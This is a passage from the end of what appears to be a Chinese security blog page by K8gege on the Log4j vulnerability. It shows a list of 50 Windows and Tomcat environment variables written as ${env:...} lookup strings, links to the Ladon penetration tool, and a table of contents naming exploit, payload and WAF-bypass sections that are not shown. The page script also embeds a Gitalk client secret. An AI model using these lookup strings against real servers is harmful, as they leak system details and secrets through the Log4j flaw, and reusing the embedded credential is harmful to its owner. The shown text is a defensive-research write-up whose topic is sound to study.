+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>     usage</span><br><span class="line">1     <span class="variable">${env:A8_HOME}</span></span><br><span class="line">2     <span class="variable">${env:A8_ROOT_BIN}</span></span><br><span class="line">3     <span class="variable">${env:ALLUSERSPROFILE}</span></span><br><span class="line">4     <span class="variable">${env:APPDATA}</span></span><br><span class="line">5     <span class="variable">${env:CATALINA_BASE}</span></span><br><span class="line">6     <span class="variable">${env:CATALINA_HOME}</span></span><br><span class="line">7     <span class="variable">${env:CATALINA_OPTS}</span></span><br><span class="line">8     <span class="variable">${env:CATALINA_TMPDIR}</span></span><br><span class="line">9     <span class="variable">${env:CLASSPATH}</span></span><br><span class="line">10     <span class="variable">${env:CLIENTNAME}</span></span><br><span class="line">11     <span class="variable">${env:COMPUTERNAME}</span></span><br><span class="line">12     <span class="variable">${env:ComSpec}</span></span><br><span class="line">13     <span class="variable">${env:CommonProgramFiles}</span></span><br><span class="line">14     <span class="variable">${env:CommonProgramFiles(x86)}</span></span><br><span class="line">15     <span class="variable">${env:CommonProgramW6432}</span></span><br><span class="line">16     <span class="variable">${env:FP_NO_HOST_CHECK}</span></span><br><span class="line">17     <span class="variable">${env:HOMEDRIVE}</span></span><br><span class="line">18     <span class="variable">${env:HOMEPATH}</span></span><br><span class="line">19     <span class="variable">${env:JRE_HOME}</span></span><br><span class="line">20     <span class="variable">${env:Java_Home}</span></span><br><span class="line">21     <span class="variable">${env:LOCALAPPDATA}</span></span><br><span class="line">22     <span class="variable">${env:LOGONSERVER}</span></span><br><span class="line">23     <span class="variable">${env:NUMBER_OF_PROCESSORS}</span></span><br><span class="line">24     <span class="variable">${env:OS}</span></span><br><span class="line">25     <span class="variable">${env:PATHEXT}</span></span><br><span class="line">26     <span class="variable">${env:PROCESSOR_ARCHITECTURE}</span></span><br><span class="line">27     <span class="variable">${env:PROCESSOR_IDENTIFIER}</span></span><br><span class="line">28     <span class="variable">${env:PROCESSOR_LEVEL}</span></span><br><span class="line">29     <span class="variable">${env:PROCESSOR_REVISION}</span></span><br><span class="line">30     <span class="variable">${env:PROMPT}</span></span><br><span class="line">31     <span class="variable">${env:PSModulePath}</span></span><br><span class="line">32     <span class="variable">${env:PUBLIC}</span></span><br><span class="line">33     <span class="variable">${env:Path}</span></span><br><span class="line">34     <span class="variable">${env:ProgramData}</span></span><br><span class="line">35     <span class="variable">${env:ProgramFiles}</span></span><br><span class="line">36     <span class="variable">${env:ProgramFiles(x86)}</span></span><br><span class="line">37     <span class="variable">${env:ProgramW6432}</span></span><br><span class="line">38     <span class="variable">${env:SESSIONNAME}</span></span><br><span class="line">39     <span class="variable">${env:SystemDrive}</span></span><br><span class="line">40     <span class="variable">${env:SystemRoot}</span></span><br><span class="line">41     <span class="variable">${env:TEMP}</span></span><br><span class="line">42     <span class="variable">${env:TMP}</span></span><br><span class="line">43     <span class="variable">${env:ThisExitCode}</span></span><br><span class="line">44     <span class="variable">${env:USERDOMAIN}</span></span><br><span class="line">45     <span class="variable">${env:USERNAME}</span></span><br><span class="line">46     <span class="variable">${env:USERPROFILE}</span></span><br><span class="line">47     <span class="variable">${env:WORK_PATH}</span></span><br><span class="line">48     <span class="variable">${env:windir}</span></span><br><span class="line">49     <span class="variable">${env:windows_tracing_flags}</span></span><br><span class="line">50     <span class="variable">${env:windows_tracing_logfile}</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Ladon下载">Ladon下载</h3>
+<p>LadonGo 3.8: <a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a><br>
+PowerLadon: <a target="_blank" rel="noopener" href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>
+历史版本: <a target="_blank" rel="noopener" href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>
+7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+9.1版本：K8小密圈</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/Ladon.html" class="pre-post btn btn-default" title="〖工具〗Ladon模块化网络渗透工具&amp;Cobalt Strike">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖工具〗Ladon模块化网络渗透工具&amp;Cobalt Strike</span>
+    </a>
+    
+    
+    <a href="/p/cs911.html" class="next-post btn btn-default" title="〖工具〗Ladon 9.1.1 &amp; CobaltStrike神龙插件发布">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖工具〗Ladon 9.1.1 &amp; CobaltStrike神龙插件发布</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E4%BA%A7%E5%93%81"><span class="toc-text">影响产品</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%831"><span class="toc-text">漏洞环境1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B01"><span class="toc-text">漏洞复现1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%832"><span class="toc-text">漏洞环境2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%8E%AF%E5%A2%832"><span class="toc-text">启动环境2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02"><span class="toc-text">漏洞复现2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A5%E4%B8%8B%E5%8D%8F%E8%AE%AE%E8%87%AA%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="toc-text">以下协议自行测试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8BC%E6%AE%B5"><span class="toc-text">批量检测C段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8Burl-txt"><span class="toc-text">批量检测url.txt</span></a></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8Ladp%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">启动Ladp服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E7%9B%91%E5%90%AC"><span class="toc-text">Ladon监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%8D%8F%E8%AE%AE"><span class="toc-text">DNS协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99"><span class="toc-text">WAF拦截规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-RC1"><span class="toc-text">Bypass RC1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-WAF"><span class="toc-text">Bypass WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">该漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E4%BA%9B%E4%BA%BA%E9%97%AE%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8dnslog%EF%BC%9F"><span class="toc-text">有些人问为什么不用dnslog？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88Ladon%E8%83%BD%E7%9B%91%E5%90%ACLDAP%E3%80%81RMI%EF%BC%9F"><span class="toc-text">为什么Ladon能监听LDAP、RMI？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80"><span class="toc-text">方案一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C"><span class="toc-text">方案二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j-JAVA"><span class="toc-text">Log4j-JAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">系统信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">环境变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E4%B8%8B%E8%BD%BD"><span class="toc-text">Ladon下载</span></a></li>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
